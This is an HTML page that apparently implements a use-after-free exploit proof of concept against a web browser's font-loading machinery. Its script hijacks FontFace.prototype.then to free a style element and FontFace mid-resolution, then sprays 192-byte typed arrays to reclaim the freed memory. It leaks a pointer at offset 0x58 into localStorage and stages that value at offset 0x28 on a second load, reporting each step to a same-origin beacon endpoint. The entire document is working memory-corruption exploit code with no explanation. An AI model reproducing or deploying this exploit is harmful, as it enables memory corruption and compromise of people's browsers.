<!DOCTYPE html><html><head><meta charset="utf-8"><title>uaf55</title>
<script>
function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
function hex8(u,o){var s='';for(var i=0;i<8;i++){s+=('0'+u[o+i].toString(16)).slice(-2)}return s}
function put64(u,o,h){ for (var i=0;i<8;i++){ u[o+i]=parseInt(h.substr(i*2,2),16)||0; } }
function le64(v,o){ var s=''; for (var i=7;i>=0;i--){ s+=('0'+v[o+i].toString(16)).slice(-2); } return s; }
/* two loads, one purpose each, because the single-arm page is the only reliable one:
   load 1 leaks p58 from the engine's own write, load 2 stages it at +0x28. */
var K=16, SIZE=192, styleEl=null, firedHere=false, MAP=[];
var U=Date.now().toString(36);
var staged=null;
try { staged = localStorage.getItem('p58'); } catch(e) { staged=null; }
var MODE = staged ? 'TEST' : 'LEAK';

function run(){
  var fam='s'+U, nm='f'+U;
  styleEl=document.createElement('style');
  styleEl.textContent="@font-face { font-family: "+fam+"; src: local(Arial); unicode-range: U+0042; }";
  document.head.appendChild(styleEl);
  var A=new FontFace(nm,'local(Helvetica)',{unicodeRange:'U+0041'});
  document.fonts.add(A); void A.loaded;
  window.__alive=[A];
  b('U55-'+MODE+'-PARSE-'+(staged||'none'));
  Object.defineProperty(FontFace.prototype,'then',{
    configurable:true,
    get:function(){
      if (firedHere) return undefined;
      firedHere=true;
      if (styleEl) styleEl.remove();
      try { document.fonts.delete(this); } catch(e) {}
      styleEl=null;
      document.body.offsetHeight;
      MAP=[];
      for (var k=0;k<K;k++){
        var u=new Uint8Array(new ArrayBuffer(SIZE));
        if (MODE==='TEST' && staged) put64(u,0x28,staged);
        MAP.push(u);
      }
      if (MODE==='TEST') b('U55-TEST-STAGED-'+staged+'-AT-28');
      try { document.fonts.check('1em '+fam); } catch(e){}
      b('U55-'+MODE+'-CHECK-RETURNED');
      return undefined;
    }, set:function(){}
  });
  document.fonts.load('1em '+nm+', '+fam, 'AB').then(function(){ b('U55-'+MODE+'-RESOLVED'); },
                                                     function(){ b('U55-'+MODE+'-REJECTED'); });
  if (MODE==='LEAK'){
    setTimeout(function(){
      for (var i=0;i<MAP.length;i++){
        var u=MAP[i];
        if (u[0x58]||u[0x59]||u[0x5A]||u[0x5B]){
          var h=le64(u,0x58);
          try { localStorage.setItem('p58', h); } catch(e){}
          b('U55-LEAK-HIT-b'+i+'-p58-'+h+'-stored');
          return;
        }
      }
      b('U55-LEAK-NOHIT');
    }, 120);
  } else {
    setTimeout(function(){ b('U55-TEST-ALIVE-120ms'); }, 120);
    setTimeout(function(){ b('U55-TEST-ALIVE-600ms'); }, 600);
  }
}
if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
else document.addEventListener('DOMContentLoaded',run);
</script></head><body><p>uaf55</p></body></html>
